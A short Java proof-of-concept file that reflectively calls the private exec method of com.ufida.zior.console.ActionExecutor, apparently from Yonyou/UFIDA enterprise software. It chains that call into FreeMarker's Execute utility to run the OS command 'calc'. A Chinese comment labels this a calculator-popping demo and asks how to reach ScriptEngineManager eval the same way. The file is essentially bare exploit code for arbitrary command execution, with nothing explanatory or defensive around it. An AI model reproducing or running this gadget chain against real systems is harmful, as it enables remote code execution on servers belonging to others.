import java.lang.reflect.Method;
import java.util.ArrayList;

public class ttttt {
    public static void main(String[] args) throws Exception {
//     如何使用freemarker.template.utility.ObjectConstructor类exec方法
//     实现("javax.script.ScriptEngineManager").getEngineByName("js").eval("print('123')")

        ArrayList list = new ArrayList();
        list.add("calc");
        Exec("freemarker.template.utility.Execute","exec",list);//弹计算机示例

    }

    public static void Exec(String cls,String method,ArrayList list) throws Exception{
        Class clazz = Class.forName("com.ufida.zior.console.ActionExecutor");
        Method met = clazz.getDeclaredMethod("exec",new Class<?>[]{String.class,String.class,Object.class});
        met.setAccessible(true);
        met.invoke(clazz,new Object[]{cls,method,list});

    }
}
